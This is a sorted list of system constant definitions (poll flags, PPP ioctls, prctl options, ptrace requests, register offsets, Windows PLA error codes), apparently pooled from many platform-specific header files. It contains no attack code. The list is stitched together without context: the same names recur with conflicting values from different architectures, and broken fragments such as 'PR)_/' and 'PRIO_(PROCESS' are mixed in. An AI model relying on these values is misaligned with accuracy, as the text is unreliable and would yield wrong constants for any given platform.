PKCS12_INCLUDE_EXTENDED_PROPERTIES = 0x00000010
PKCS12_NO_PERSIST_KEY              = 0x00008000
PKCS12_PREFER_CNG_KSP              = 0x00000100
PKCS_7_ASN_ENCODING = 0x00010000
PLA_E_CABAPI_FAILURE                                                      Handle        = 0x80300113
PLA_E_CONFLICT_INCL_EXCL_API                                              Handle        = 0x80300105
PLA_E_CREDENTIALS_REQUIRED                                                Handle        = 0x80300103
PLA_E_DCS_ALREADY_EXISTS                                                  Handle        = 0x803000B7
PLA_E_DCS_IN_USE                                                          Handle        = 0x803000AA
PLA_E_DCS_NOT_FOUND                                                       Handle        = 0x80300002
PLA_E_DCS_NOT_RUNNING                                                     Handle        = 0x80300104
PLA_E_DCS_SINGLETON_REQUIRED                                              Handle        = 0x80300102
PLA_E_DCS_START_WAIT_TIMEOUT                                              Handle        = 0x8030010A
PLA_E_DC_ALREADY_EXISTS                                                   Handle        = 0x80300109
PLA_E_DC_START_WAIT_TIMEOUT                                               Handle        = 0x8030010B
PLA_E_EXE_ALREADY_CONFIGURED                                              Handle        = 0x80300107
PLA_E_EXE_FULL_PATH_REQUIRED                                              Handle        = 0x8030010E
PLA_E_EXE_PATH_NOT_VALID                                                  Handle        = 0x80300108
PLA_E_INVALID_SESSION_NAME                                                Handle        = 0x8030010F
PLA_E_NETWORK_EXE_NOT_VALID                                               Handle        = 0x80300106
PLA_E_NO_DUPLICATES                                                       Handle        = 0x8030010D
PLA_E_NO_MIN_DISK                                                         Handle        = 0x80300070
PLA_E_PLA_CHANNEL_NOT_ENABLED                                             Handle        = 0x80300110
PLA_E_PROPERTY_CONFLICT                                                   Handle        = 0x80300101
PLA_E_REPORT_WAIT_TIMEOUT                                                 Handle        = 0x8030010C
PLA_E_RULES_MANAGER_FAILED                                                Handle        = 0x80300112
PLA_E_TASKSCHED_CHANNEL_NOT_ENABLED                                       Handle        = 0x80300111
PLA_E_TOO_MANY_FOLDERS                                                    Handle        = 0x80300045
PLA_S_PROPERTY_IGNORED                                                    Handle        = 0x00300100
PL_FLAG_BORN   = 0x100
PL_FLAG_EXITED = 0x200
PL_FLAG_SI     = 0x20
POLLERR                         = 0x0020
POLLERR      = 0x8
POLLERR    = 0x4000
POLLERR    = 0x8
POLLERR  = 0x8
POLLHUP                         = 0x0040
POLLHUP      = 0x10
POLLHUP    = 0x10
POLLHUP    = 0x2000
POLLHUP  = 0x10
POLLIN                          = 0x0003
POLLIN       = 0x1
POLLIN     = 0x1
POLLIN   = 0x1
POLLINIGNEOF = 0x2000
POLLNVAL                        = 0x0080
POLLNVAL     = 0x20
POLLNVAL   = 0x20
POLLNVAL   = 0x8000
POLLNVAL = 0x20
POLLOUT                         = 0x0004
POLLOUT      = 0x4
POLLOUT    = 0x2
POLLOUT    = 0x4
POLLOUT  = 0x4
POLLPRI                         = 0x0010
POLLPRI      = 0x2
POLLPRI    = 0x2
POLLPRI    = 0x4
POLLPRI  = 0x2
POLLRDBAND   = 0x80
POLLRDBAND = 0x20
POLLRDBAND = 0x80
POLLRDHUP = 0x2000
POLLRDHUP = 0x800
POLLRDNORM   = 0x40
POLLRDNORM = 0x10
POLLRDNORM = 0x40
POLLWRBAND   = 0x100
POLLWRBAND = 0x100
POLLWRBAND = 0x40
POLLWRNORM   = 0x4
POLLWRNORM = 0x2
POLLWRNORM = 0x4
PORT_ALERT_INVALID = 0x3
PORT_ALERT_SET     = 0x1
PORT_ALERT_UPDATE  = 0x2
PORT_SOURCE_AIO    = 0x1
PORT_SOURCE_ALERT  = 0x5
PORT_SOURCE_FD     = 0x4
PORT_SOURCE_FILE   = 0x7
PORT_SOURCE_MQ     = 0x6
PORT_SOURCE_TIMER  = 0x2
PORT_SOURCE_USER   = 0x3
POSIX/GNU-style --flags.
PPC_CMM_MAGIC                               = 0xc7571590
PPPIOC/ 
PPPIOCATTACH                     = 0x4004743d
PPPIOCATTACH                     = 0x8004743d
PPPIOCATTCHAN                    = 0x40047438
PPPIOCATTCHAN                    = 0x80047438
PPPIOCBRIDGECHAN                 = 0x40047435
PPPIOCBRIDGECHAN                 = 0x80047435
PPPIOCCONNECT                    = 0x4004743a
PPPIOCCONNECT                    = 0x8004743a
PPPIOCDETACH                     = 0x4004743c
PPPIOCDETACH                     = 0x8004743c
PPPIOCDISCONN                    = 0x20007439
PPPIOCDISCONN                    = 0x7439
PPPIOCGASYNCMAP                  = 0x40047458
PPPIOCGASYNCMAP                  = 0x80047458
PPPIOCGCHAN                      = 0x40047437
PPPIOCGCHAN                      = 0x80047437
PPPIOCGDEBUG                     = 0x40047441
PPPIOCGDEBUG                     = 0x80047441
PPPIOCGFLAGS                     = 0x4004745a
PPPIOCGFLAGS                     = 0x8004745a
PPPIOCGIDLE                      = 0x4008743f
PPPIOCGIDLE                      = 0x4010743f
PPPIOCGIDLE                      = 0x8008743f
PPPIOCGIDLE                      = 0x8010743f
PPPIOCGIDLE32                    = 0x4008743f
PPPIOCGIDLE32                    = 0x8008743f
PPPIOCGIDLE64                    = 0x4010743f
PPPIOCGIDLE64                    = 0x8010743f
PPPIOCGL2TPSTATS                 = 0x40487436
PPPIOCGL2TPSTATS                 = 0x80487436
PPPIOCGMRU                       = 0x40047453
PPPIOCGMRU                       = 0x80047453
PPPIOCGNPMODE                               = 0xc008744c
PPPIOCGRASYNCMAP                 = 0x40047455
PPPIOCGRASYNCMAP                 = 0x80047455
PPPIOCGUNIT                      = 0x40047456
PPPIOCGUNIT                      = 0x80047456
PPPIOCGXASYNCMAP                 = 0x40207450
PPPIOCGXASYNCMAP                 = 0x80207450
PPPIOCNEWUNIT                               = 0xc004743e
PPPIOCSACTIVE                    = 0x40087446
PPPIOCSACTIVE                    = 0x40107446
PPPIOCSACTIVE                    = 0x80087446
PPPIOCSACTIVE                    = 0x80107446
PPPIOCSASYNCMAP                  = 0x40047457
PPPIOCSASYNCMAP                  = 0x80047457
PPPIOCSCOMPRESS                  = 0x400c744d
PPPIOCSCOMPRESS                  = 0x4010744d
PPPIOCSCOMPRESS                  = 0x800c744d
PPPIOCSCOMPRESS                  = 0x8010744d
PPPIOCSDEBUG                     = 0x40047440
PPPIOCSDEBUG                     = 0x80047440
PPPIOCSFLAGS                     = 0x40047459
PPPIOCSFLAGS                     = 0x80047459
PPPIOCSMAXCID                    = 0x40047451
PPPIOCSMAXCID                    = 0x80047451
PPPIOCSMRRU                      = 0x4004743b
PPPIOCSMRRU                      = 0x8004743b
PPPIOCSMRU                       = 0x40047452
PPPIOCSMRU                       = 0x80047452
PPPIOCSNPMODE                    = 0x4008744b
PPPIOCSNPMODE                    = 0x8008744b
PPPIOCSPASS                      = 0x40087447
PPPIOCSPASS                      = 0x40107447
PPPIOCSPASS                      = 0x80087447
PPPIOCSPASS                      = 0x80107447
PPPIOCSRASYNCMAP                 = 0x40047454
PPPIOCSRASYNCMAP                 = 0x80047454
PPPIOCSXASYNCMAP                 = 0x4020744f
PPPIOCSXASYNCMAP                 = 0x8020744f
PPPIOCUNBRIDGECHAN               = 0x20007434
PPPIOCUNBRIDGECHAN               = 0x7434
PPPIOCXFERUNIT                   = 0x2000744e
PPPIOCXFERUNIT                   = 0x744e
PPS_FETCH     = 0xc00470a4
PPS_FETCH     = 0xc00870a4
PPS_GETCAP    = 0x400470a3
PPS_GETCAP    = 0x400870a3
PPS_GETCAP    = 0x800470a3
PPS_GETCAP    = 0x800870a3
PPS_GETPARAMS = 0x400470a1
PPS_GETPARAMS = 0x400870a1
PPS_GETPARAMS = 0x800470a1
PPS_GETPARAMS = 0x800870a1
PPS_SETPARAMS = 0x400470a2
PPS_SETPARAMS = 0x400870a2
PPS_SETPARAMS = 0x800470a2
PPS_SETPARAMS = 0x800870a2
PR)_/ 
PRIO_(PROCESS
PRIO_PGRP                                   = 0x1
PRIO_PGRP                               = 0x1
PRIO_PGRP                         = 0x1
PRIO_PGRP                       = 2
PRIO_PGRP                      = 0x1
PRIO_PGRP                     = 0x1
PRIO_PROCESS                                = 0x0
PRIO_PROCESS                            = 0x0
PRIO_PROCESS                      = 0x0
PRIO_PROCESS                    = 1
PRIO_PROCESS                   = 0x0
PRIO_PROCESS                  = 0x0
PRIO_USER                                   = 0x2
PRIO_USER                               = 0x2
PRIO_USER                         = 0x2
PRIO_USER                       = 3
PRIO_USER                      = 0x2
PRIO_USER                     = 0x2
PRI_IOFLUSH                       = 0x7c
PROCESS_CREATE_PROCESS            = 0x0080
PROCESS_CREATE_THREAD             = 0x0002
PROCESS_DUP_HANDLE                = 0x0040
PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
PROCESS_MODE_BACKGROUND_END   = 0x00200000
PROCESS_QUERY_INFORMATION         = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_SET_INFORMATION           = 0x0200
PROCESS_SET_QUOTA                 = 0x0100
PROCESS_SUSPEND_RESUME            = 0x0800
PROCESS_TERMINATE                 = 0x0001
PROCESS_VM_OPERATION              = 0x0008
PROCESS_VM_READ                   = 0x0010
PROCESS_VM_WRITE                  = 0x0020
PROC_SUPER_MAGIC                            = 0x9fa0
PROC_THREAD_ATTRIBUTE_GROUP_AFFINITY    = 0x00030003
PROC_THREAD_ATTRIBUTE_HANDLE_LIST       = 0x00020002
PROC_THREAD_ATTRIBUTE_IDEAL_PROCESSOR   = 0x00030005
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000
PROC_THREAD_ATTRIBUTE_PREFERRED_NODE    = 0x00020004
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL  = 0x0002000b
PROC_THREAD_ATTRIBUTE_UMS_THREAD        = 0x00030006
PROT
PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000
PROTO
PROT_BTI                         = 0x10
PROT_EXEC                                   = 0x4
PROT_EXEC                               = 0x4
PROT_EXEC                         = 0x4
PROT_EXEC                       = 0x8 // can be executed
PROT_EXEC                      = 0x4
PROT_EXEC                     = 0x4
PROT_GROWSDOWN                              = 0x1000000
PROT_GROWSUP                                = 0x2000000
PROT_MTE                         = 0x20
PROT_NONE                                   = 0x0
PROT_NONE                               = 0x0
PROT_NONE                         = 0x0
PROT_NONE                       = 0x4 // can't be accessed
PROT_NONE                      = 0x0
PROT_NONE                     = 0x0
PROT_READ                                   = 0x1
PROT_READ                               = 0x1
PROT_READ                         = 0x1
PROT_READ                       = 0x1 // mmap - page can be read
PROT_READ                      = 0x1
PROT_READ                     = 0x1
PROT_SAO                         = 0x10
PROT_WRITE                                  = 0x2
PROT_WRITE                              = 0x2
PROT_WRITE                        = 0x2
PROT_WRITE                      = 0x2 // page can be written
PROT_WRITE                     = 0x2
PROT_WRITE                    = 0x2
PROV_DH_SCHANNEL   = 18
PROV_DSS           = 3
PROV_DSS_DH        = 13
PROV_EC_ECDSA_FULL = 16
PROV_EC_ECDSA_SIG  = 14
PROV_EC_ECNRA_FULL = 17
PROV_EC_ECNRA_SIG  = 15
PROV_FORTEZZA      = 4
PROV_INTEL_SEC     = 22
PROV_MS_EXCHANGE   = 5
PROV_REPLACE_OWF   = 23
PROV_RNG           = 21
PROV_RSA_AES       = 24
PROV_RSA_FULL      = 1
PROV_RSA_SCHANNEL  = 12
PROV_RSA_SIG       = 2
PROV_SPYRUS_LYNKS  = 20
PROV_SSL           = 6
PR_64BIT                      = 0x20
PR_ADDR                       = 0x2
PR_ARGEXT                     = 0x400
PR_ATOMIC                     = 0x1
PR_CAPBSET_DROP                             = 0x18
PR_CAPBSET_READ                             = 0x17
PR_CAP_AMBIENT                              = 0x2f
PR_CAP_AMBIENT_CLEAR_ALL                    = 0x4
PR_CAP_AMBIENT_IS_SET                       = 0x1
PR_CAP_AMBIENT_LOWER                        = 0x3
PR_CAP_AMBIENT_RAISE                        = 0x2
PR_CONNREQUIRED               = 0x4
PR_ENDIAN_BIG                               = 0x0
PR_ENDIAN_LITTLE                            = 0x1
PR_ENDIAN_PPC_LITTLE                        = 0x2
PR_FASTHZ                     = 0x5
PR_FPEMU_NOPRINT                            = 0x1
PR_FPEMU_SIGFPE                             = 0x2
PR_FP_EXC_ASYNC                             = 0x2
PR_FP_EXC_DISABLED                          = 0x0
PR_FP_EXC_DIV                               = 0x10000
PR_FP_EXC_INV                               = 0x100000
PR_FP_EXC_NONRECOV                          = 0x1
PR_FP_EXC_OVF                               = 0x20000
PR_FP_EXC_PRECISE                           = 0x3
PR_FP_EXC_RES                               = 0x80000
PR_FP_EXC_SW_ENABLE                         = 0x80
PR_FP_EXC_UND                               = 0x40000
PR_FP_MODE_FR                               = 0x1
PR_FP_MODE_FRE                              = 0x2
PR_GET_CHILD_SUBREAPER                      = 0x25
PR_GET_DUMPABLE                             = 0x3
PR_GET_ENDIAN                               = 0x13
PR_GET_FPEMU                                = 0x9
PR_GET_FPEXC                                = 0xb
PR_GET_FP_MODE                              = 0x2e
PR_GET_IO_FLUSHER                           = 0x3a
PR_GET_KEEPCAPS                             = 0x7
PR_GET_NAME                                 = 0x10
PR_GET_NO_NEW_PRIVS                         = 0x27
PR_GET_PDEATHSIG                            = 0x2
PR_GET_SECCOMP                              = 0x15
PR_GET_SECUREBITS                           = 0x1b
PR_GET_SPECULATION_CTRL                     = 0x34
PR_GET_TAGGED_ADDR_CTRL                     = 0x38
PR_GET_THP_DISABLE                          = 0x2a
PR_GET_TID_ADDRESS                          = 0x28
PR_GET_TIMERSLACK                           = 0x1e
PR_GET_TIMING                               = 0xd
PR_GET_TSC                                  = 0x19
PR_GET_UNALIGN                              = 0x5
PR_INP                        = 0x40
PR_INTRLEVEL                  = 0x8000
PR_MCE_KILL                                 = 0x21
PR_MCE_KILL_CLEAR                           = 0x0
PR_MCE_KILL_DEFAULT                         = 0x2
PR_MCE_KILL_EARLY                           = 0x1
PR_MCE_KILL_GET                             = 0x22
PR_MCE_KILL_LATE                            = 0x0
PR_MCE_KILL_SET                             = 0x1
PR_MLS                        = 0x100
PR_MLS_1_LABEL                = 0x200
PR_MPX_DISABLE_MANAGEMENT                   = 0x2c
PR_MPX_ENABLE_MANAGEMENT                    = 0x2b
PR_MTE_TAG_MASK                             = 0x7fff8
PR_MTE_TAG_SHIFT                            = 0x3
PR_MTE_TCF_ASYNC                            = 0x4
PR_MTE_TCF_MASK                             = 0x6
PR_MTE_TCF_NONE                             = 0x0
PR_MTE_TCF_SHIFT                            = 0x1
PR_MTE_TCF_SYNC                             = 0x2
PR_NOEOR                      = 0x4000
PR_PAC_APDAKEY                              = 0x4
PR_PAC_APDBKEY                              = 0x8
PR_PAC_APGAKEY                              = 0x10
PR_PAC_APIAKEY                              = 0x1
PR_PAC_APIBKEY                              = 0x2
PR_PAC_GET_ENABLED_KEYS                     = 0x3d
PR_PAC_RESET_KEYS                           = 0x36
PR_PAC_SET_ENABLED_KEYS                     = 0x3c
PR_RIGHTS                     = 0x10
PR_SCHED_CORE                               = 0x3e
PR_SCHED_CORE_CREATE                        = 0x1
PR_SCHED_CORE_GET                           = 0x0
PR_SCHED_CORE_MAX                           = 0x4
PR_SCHED_CORE_SCOPE_PROCESS_GROUP           = 0x2
PR_SCHED_CORE_SCOPE_THREAD                  = 0x0
PR_SCHED_CORE_SCOPE_THREAD_GROUP            = 0x1
PR_SCHED_CORE_SHARE_FROM                    = 0x3
PR_SCHED_CORE_SHARE_TO                      = 0x2
PR_SET_CHILD_SUBREAPER                      = 0x24
PR_SET_DUMPABLE                             = 0x4
PR_SET_ENDIAN                               = 0x14
PR_SET_FPEMU                                = 0xa
PR_SET_FPEXC                                = 0xc
PR_SET_FP_MODE                              = 0x2d
PR_SET_IO_FLUSHER                           = 0x39
PR_SET_KEEPCAPS                             = 0x8
PR_SET_MM                                   = 0x23
PR_SET_MM_ARG_END                           = 0x9
PR_SET_MM_ARG_START                         = 0x8
PR_SET_MM_AUXV                              = 0xc
PR_SET_MM_BRK                               = 0x7
PR_SET_MM_END_CODE                          = 0x2
PR_SET_MM_END_DATA                          = 0x4
PR_SET_MM_ENV_END                           = 0xb
PR_SET_MM_ENV_START                         = 0xa
PR_SET_MM_EXE_FILE                          = 0xd
PR_SET_MM_MAP                               = 0xe
PR_SET_MM_MAP_SIZE                          = 0xf
PR_SET_MM_START_BRK                         = 0x6
PR_SET_MM_START_CODE                        = 0x1
PR_SET_MM_START_DATA                        = 0x3
PR_SET_MM_START_STACK                       = 0x5
PR_SET_NAME                                 = 0xf
PR_SET_NO_NEW_PRIVS                         = 0x26
PR_SET_PDEATHSIG                            = 0x1
PR_SET_PTRACER                              = 0x59616d61
PR_SET_PTRACER_ANY               = 0xffffffff
PR_SET_PTRACER_ANY               = 0xffffffffffffffff
PR_SET_SECCOMP                              = 0x16
PR_SET_SECUREBITS                           = 0x1c
PR_SET_SPECULATION_CTRL                     = 0x35
PR_SET_SYSCALL_USER_DISPATCH                = 0x3b
PR_SET_TAGGED_ADDR_CTRL                     = 0x37
PR_SET_THP_DISABLE                          = 0x29
PR_SET_TIMERSLACK                           = 0x1d
PR_SET_TIMING                               = 0xe
PR_SET_TSC                                  = 0x1a
PR_SET_UNALIGN                              = 0x6
PR_SET_VMA                                  = 0x53564d41
PR_SET_VMA_ANON_NAME                        = 0x0
PR_SLOWHZ                     = 0x2
PR_SME_GET_VL                               = 0x40
PR_SME_SET_VL                               = 0x3f
PR_SME_SET_VL_ONEXEC                        = 0x40000
PR_SME_VL_INHERIT                           = 0x20000
PR_SME_VL_LEN_MASK                          = 0xffff
PR_SPEC_DISABLE                             = 0x4
PR_SPEC_DISABLE_NOEXEC                      = 0x10
PR_SPEC_ENABLE                              = 0x2
PR_SPEC_FORCE_DISABLE                       = 0x8
PR_SPEC_INDIRECT_BRANCH                     = 0x1
PR_SPEC_L1D_FLUSH                           = 0x2
PR_SPEC_NOT_AFFECTED                        = 0x0
PR_SPEC_PRCTL                               = 0x1
PR_SPEC_STORE_BYPASS                        = 0x0
PR_SVE_GET_VL                               = 0x33
PR_SVE_SET_VL                               = 0x32
PR_SVE_SET_VL_ONEXEC                        = 0x40000
PR_SVE_VL_INHERIT                           = 0x20000
PR_SVE_VL_LEN_MASK                          = 0xffff
PR_SYS_DISPATCH_OFF                         = 0x0
PR_SYS_DISPATCH_ON                          = 0x1
PR_TAGGED_ADDR_ENABLE                       = 0x1
PR_TASK_PERF_EVENTS_DISABLE                 = 0x1f
PR_TASK_PERF_EVENTS_ENABLE                  = 0x20
PR_TIMING_STATISTICAL                       = 0x0
PR_TIMING_TIMESTAMP                         = 0x1
PR_TSC_ENABLE                               = 0x1
PR_TSC_SIGSEGV                              = 0x2
PR_UNALIGN_NOPRINT                          = 0x1
PR_UNALIGN_SIGBUS                           = 0x2
PR_WANTRCVD                   = 0x8
PSM      uint16
PSTOREFS_MAGIC                              = 0x6165676c
PT)_/ 
PTRACE
PTRACE_ARCH_PRCTL                = 0x1e
PTRACE_ATTACH                               = 0x10
PTRACE_ATTACH     = 0xa
PTRACE_CONT                                 = 0x7
PTRACE_CONT       = 0x7
PTRACE_CONT    = 0x7
PTRACE_DETACH                               = 0x11
PTRACE_DETACH     = 0xb
PTRACE_DISABLE_TE                = 0x5010
PTRACE_ENABLE_TE                 = 0x5009
PTRACE_EVENTMSG_SYSCALL_ENTRY               = 0x1
PTRACE_EVENTMSG_SYSCALL_EXIT                = 0x2
PTRACE_EVENT_CLONE                          = 0x3
PTRACE_EVENT_EXEC                           = 0x4
PTRACE_EVENT_EXIT                           = 0x6
PTRACE_EVENT_FORK                           = 0x1
PTRACE_EVENT_SECCOMP                        = 0x7
PTRACE_EVENT_STOP                           = 0x80
PTRACE_EVENT_VFORK                          = 0x2
PTRACE_EVENT_VFORK_DONE                     = 0x5
PTRACE_GETCRUNCHREGS             = 0x19
PTRACE_GETEVENTMSG                          = 0x4201
PTRACE_GETEVRREGS                = 0x14
PTRACE_GETFDPIC                  = 0x1f
PTRACE_GETFDPIC_EXEC             = 0x0
PTRACE_GETFDPIC_INTERP           = 0x1
PTRACE_GETFPAREGS                = 0x14
PTRACE_GETFPREGS                 = 0xe
PTRACE_GETFPREGS  = 0x23
PTRACE_GETFPREGS64               = 0x19
PTRACE_GETFPXREGS                = 0x12
PTRACE_GETFSBASE  = 0x47
PTRACE_GETHBPREGS                = 0x1d
PTRACE_GETLWPLIST = 0xf
PTRACE_GETNUMLWPS = 0xe
PTRACE_GETREGS                              = 0xc
PTRACE_GETREGS    = 0x21
PTRACE_GETREGS64                 = 0x16
PTRACE_GETREGSET                            = 0x4204
PTRACE_GETSIGINFO                           = 0x4202
PTRACE_GETSIGMASK                           = 0x420a
PTRACE_GETVFPREGS                = 0x1b
PTRACE_GETVRREGS                 = 0x12
PTRACE_GETVSRREGS                = 0x1b
PTRACE_GETWMMXREGS               = 0x12
PTRACE_GETXSTATE  = 0x45
PTRACE_GET_DEBUGREG              = 0x19
PTRACE_GET_LAST_BREAK            = 0x5006
PTRACE_GET_RSEQ_CONFIGURATION               = 0x420f
PTRACE_GET_SYSCALL_INFO                     = 0x420e
PTRACE_GET_THREAD_AREA           = 0x16
PTRACE_GET_THREAD_AREA           = 0x19
PTRACE_GET_THREAD_AREA_3264      = 0xc4
PTRACE_GET_WATCH_REGS            = 0xd0
PTRACE_INTERRUPT                            = 0x4207
PTRACE_IO         = 0xc
PTRACE_KILL                                 = 0x8
PTRACE_KILL       = 0x8
PTRACE_KILL    = 0x8
PTRACE_LISTEN                               = 0x4208
PTRACE_LWPEVENTS  = 0x18
PTRACE_LWPINFO    = 0xd
PTRACE_OLDSETOPTIONS             = 0x15
PTRACE_O_EXITKILL                           = 0x100000
PTRACE_O_MASK                               = 0x3000ff
PTRACE_O_SUSPEND_SECCOMP                    = 0x200000
PTRACE_O_TRACECLONE                         = 0x8
PTRACE_O_TRACEEXEC                          = 0x10
PTRACE_O_TRACEEXIT                          = 0x40
PTRACE_O_TRACEFORK                          = 0x2
PTRACE_O_TRACESECCOMP                       = 0x80
PTRACE_O_TRACESYSGOOD                       = 0x1
PTRACE_O_TRACEVFORK                         = 0x4
PTRACE_O_TRACEVFORKDONE                     = 0x20
PTRACE_PEEKDATA                             = 0x2
PTRACE_PEEKDATA_3264             = 0xc1
PTRACE_PEEKDATA_AREA             = 0x5003
PTRACE_PEEKMTETAGS               = 0x21
PTRACE_PEEKSIGINFO                          = 0x4209
PTRACE_PEEKSIGINFO_SHARED                   = 0x1
PTRACE_PEEKTEXT                             = 0x1
PTRACE_PEEKTEXT_3264             = 0xc0
PTRACE_PEEKTEXT_AREA             = 0x5002
PTRACE_PEEKUSR                              = 0x3
PTRACE_PEEKUSR_AREA              = 0x5000
PTRACE_PEEK_SYSTEM_CALL          = 0x5007
PTRACE_POKEDATA                             = 0x5
PTRACE_POKEDATA_3264             = 0xc3
PTRACE_POKEDATA_AREA             = 0x5005
PTRACE_POKEMTETAGS               = 0x22
PTRACE_POKETEXT                             = 0x4
PTRACE_POKETEXT_3264             = 0xc2
PTRACE_POKETEXT_AREA             = 0x5004
PTRACE_POKEUSR                              = 0x6
PTRACE_POKEUSR_AREA              = 0x5001
PTRACE_POKE_SYSTEM_CALL          = 0x5008
PTRACE_PROT                      = 0x15
PTRACE_READDATA                  = 0x10
PTRACE_READTEXT                  = 0x12
PTRACE_SECCOMP_GET_FILTER                   = 0x420c
PTRACE_SECCOMP_GET_METADATA                 = 0x420d
PTRACE_SEIZE                                = 0x4206
PTRACE_SETCRUNCHREGS             = 0x1a
PTRACE_SETEVRREGS                = 0x15
PTRACE_SETFPAREGS                = 0x15
PTRACE_SETFPREGS                 = 0xf
PTRACE_SETFPREGS  = 0x24
PTRACE_SETFPREGS64               = 0x1a
PTRACE_SETFPXREGS                = 0x13
PTRACE_SETHBPREGS                = 0x1e
PTRACE_SETOPTIONS                           = 0x4200
PTRACE_SETREGS                              = 0xd
PTRACE_SETREGS    = 0x22
PTRACE_SETREGS64                 = 0x17
PTRACE_SETREGSET                            = 0x4205
PTRACE_SETSIGINFO                           = 0x4203
PTRACE_SETSIGMASK                           = 0x420b
PTRACE_SETVFPREGS                = 0x1c
PTRACE_SETVRREGS                 = 0x13
PTRACE_SETVSRREGS                = 0x1c
PTRACE_SETWMMXREGS               = 0x13
PTRACE_SET_DEBUGREG              = 0x1a
PTRACE_SET_SYSCALL               = 0x17
PTRACE_SET_THREAD_AREA           = 0x1a
PTRACE_SET_WATCH_REGS            = 0xd1
PTRACE_SINGLEBLOCK               = 0x100
PTRACE_SINGLEBLOCK               = 0x21
PTRACE_SINGLEBLOCK               = 0xc
PTRACE_SINGLESTEP                           = 0x9
PTRACE_SINGLESTEP = 0x9
PTRACE_SPARC_DETACH              = 0xb
PTRACE_SYSCALL                              = 0x18
PTRACE_SYSCALL_INFO_ENTRY                   = 0x1
PTRACE_SYSCALL_INFO_EXIT                    = 0x2
PTRACE_SYSCALL_INFO_NONE                    = 0x0
PTRACE_SYSCALL_INFO_SECCOMP                 = 0x3
PTRACE_SYSEMU                    = 0x1d
PTRACE_SYSEMU                    = 0x1f
PTRACE_SYSEMU_SINGLESTEP         = 0x1e
PTRACE_SYSEMU_SINGLESTEP         = 0x20
PTRACE_TE_ABORT_RAND             = 0x5011
PTRACE_TRACEME                              = 0x0
PTRACE_TRACEME    = 0x0
PTRACE_TRACEME = 0x0
PTRACE_WRITEDATA                 = 0x11
PTRACE_WRITETEXT                 = 0x13
PTSSTTY = (int32('P') << 8) 
PT_ACR0                          = 0x90
PT_ACR1                          = 0x94
PT_ACR10                         = 0xb8
PT_ACR11                         = 0xbc
PT_ACR12                         = 0xc0
PT_ACR13                         = 0xc4
PT_ACR14                         = 0xc8
PT_ACR15                         = 0xcc
PT_ACR2                          = 0x98
PT_ACR3                          = 0x9c
PT_ACR4                          = 0xa0
PT_ACR5                          = 0xa4
PT_ACR6                          = 0xa8
PT_ACR7                          = 0xac
PT_ACR8                          = 0xb0
PT_ACR9                          = 0xb4
PT_ATTACH                               = 0xa
PT_ATTACHEXC                            = 0xe
PT_CCR                           = 0x26
PT_CONTINUE                             = 0x7
PT_CR_10                         = 0x168
PT_CR_11                         = 0x170
PT_CR_9                          = 0x160
PT_CTR                           = 0x23
PT_DAR                           = 0x29
PT_DATA_ADDR                     = 0x10004
PT_DENY_ATTACH                          = 0x1f
PT_DETACH                               = 0xb
PT_DSCR                          = 0x2c
PT_DSISR                         = 0x2a
PT_ENDREGS                       = 0x1af
PT_FIRSTMACH                            = 0x20
PT_FORCEQUOTA                           = 0x1e
PT_FP                            = 0x48
PT_FPC                           = 0xd8
PT_FPR0                          = 0x30
PT_FPR0                          = 0xe0
PT_FPR1                          = 0xe8
PT_FPR10                         = 0x130
PT_FPR11                         = 0x138
PT_FPR12                         = 0x140
PT_FPR13                         = 0x148
PT_FPR14                         = 0x150
PT_FPR15                         = 0x158
PT_FPR2                          = 0xf0
PT_FPR3                          = 0xf8
PT_FPR31                         = 0x6e
PT_FPR4                          = 0x100
PT_FPR5                          = 0x108
PT_FPR6                          = 0x110
PT_FPR7                          = 0x118
PT_FPR8                          = 0x120
PT_FPR9                          = 0x128
PT_FPSCR                         = 0x50
PT_FPSCR                         = 0x71
PT_G0                            = 0x10
PT_G1                            = 0x14
PT_G2                            = 0x18
PT_G3                            = 0x1c
PT_G4                            = 0x20
PT_G5                            = 0x24
PT_G6                            = 0x28
PT_G7                            = 0x2c
PT_GPR0                          = 0x10
PT_GPR1                          = 0x18
PT_GPR10                         = 0x60
PT_GPR11                         = 0x68
PT_GPR12                         = 0x70
PT_GPR13                         = 0x78
PT_GPR14                         = 0x80
PT_GPR15                         = 0x88
PT_GPR2                          = 0x20
PT_GPR3                          = 0x28
PT_GPR4                          = 0x30
PT_GPR5                          = 0x38
PT_GPR6                          = 0x40
PT_GPR7                          = 0x48
PT_GPR8                          = 0x50
PT_GPR9                          = 0x58
PT_I0                            = 0x30
PT_I1                            = 0x34
PT_I2                            = 0x38
PT_I3                            = 0x3c
PT_I4                            = 0x40
PT_I5                            = 0x44
PT_I6                            = 0x48
PT_I7                            = 0x4c
PT_IEEE_IP                       = 0x1a8
PT_KILL                                 = 0x8
PT_LASTOFF                       = 0x1a8
PT_LNK                           = 0x24
PT_MASK                           = 0x3ff000
PT_MQ                            = 0x27
PT_MSR                           = 0x21
PT_NIP                           = 0x20
PT_NPC                           = 0x8
PT_ORIGGPR2                      = 0xd0
PT_ORIG_R3                       = 0x22
PT_PC                            = 0x4
PT_PSR                           = 0x0
PT_PSWADDR                       = 0x8
PT_PSWMASK                       = 0x0
PT_R0                            = 0x0
PT_R1                            = 0x1
PT_R10                           = 0xa
PT_R11                           = 0xb
PT_R12                           = 0xc
PT_R13                           = 0xd
PT_R14                           = 0xe
PT_R15                           = 0xf
PT_R16                           = 0x10
PT_R17                           = 0x11
PT_R18                           = 0x12
PT_R19                           = 0x13
PT_R2                            = 0x2
PT_R20                           = 0x14
PT_R21                           = 0x15
PT_R22                           = 0x16
PT_R23                           = 0x17
PT_R24                           = 0x18
PT_R25                           = 0x19
PT_R26                           = 0x1a
PT_R27                           = 0x1b
PT_R28                           = 0x1c
PT_R29                           = 0x1d
PT_R3                            = 0x3
PT_R30                           = 0x1e
PT_R31                           = 0x1f
PT_R4                            = 0x4
PT_R5                            = 0x5
PT_R6                            = 0x6
PT_R7                            = 0x7
PT_R8                            = 0x8
PT_R9                            = 0x9
PT_READ_D                               = 0x2
PT_READ_I                               = 0x1
PT_READ_U                               = 0x3
PT_REGS_COUNT                    = 0x2c
PT_REGS_MAGIC                    = 0x57ac6c00
PT_RESULT                        = 0x2b
PT_SIGEXC                               = 0xc
PT_SOFTE                         = 0x27
PT_STEP                                 = 0x9
